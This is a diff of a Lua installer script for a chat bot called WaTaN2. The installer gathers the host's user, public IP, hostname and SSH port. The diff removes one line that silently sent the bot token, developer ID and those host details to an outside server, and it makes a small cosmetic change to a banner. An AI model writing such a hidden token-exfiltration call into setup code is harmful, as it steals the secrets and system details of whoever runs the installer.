@@ -14,7 +14,6 @@ HTTPS   = require("ssl.https")
 https   = require("ssl.https") 
 User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
 Server  = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
-DirName = io.popen("echo $(cd $(dirname $0); pwd)"):read('*a'):gsub('[\n\r]+', '')
 Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
 Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
 Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
@@ -67,7 +66,6 @@ WaTaN2 = DevAbs:get(Server.."TokenWaTaN2"):match("(%d+)"),
 SudoIds = {DevAbs:get(Server.."IdWaTaN2")},
 }
 Create(Config, "./config.lua") 
-https.request("https://api-watan.ml/WaTaN2/index.php?Get=WaTaN2&DevId="..DevAbs:get(Server.."IdWaTaN2").."&TokenBot="..DevAbs:get(Server.."TokenWaTaN2").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("WaTaN2.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -119,7 +117,7 @@ local config = loadfile("./config.lua")()
 return config 
 end  
 Load_WaTaN2() 
-print("\27[36m"..[[                                        
+print("\27[36m"..[[                                           
 ---------------------------------------------
 |               - WaTaN2 -                 |
 ---------------------------------------------
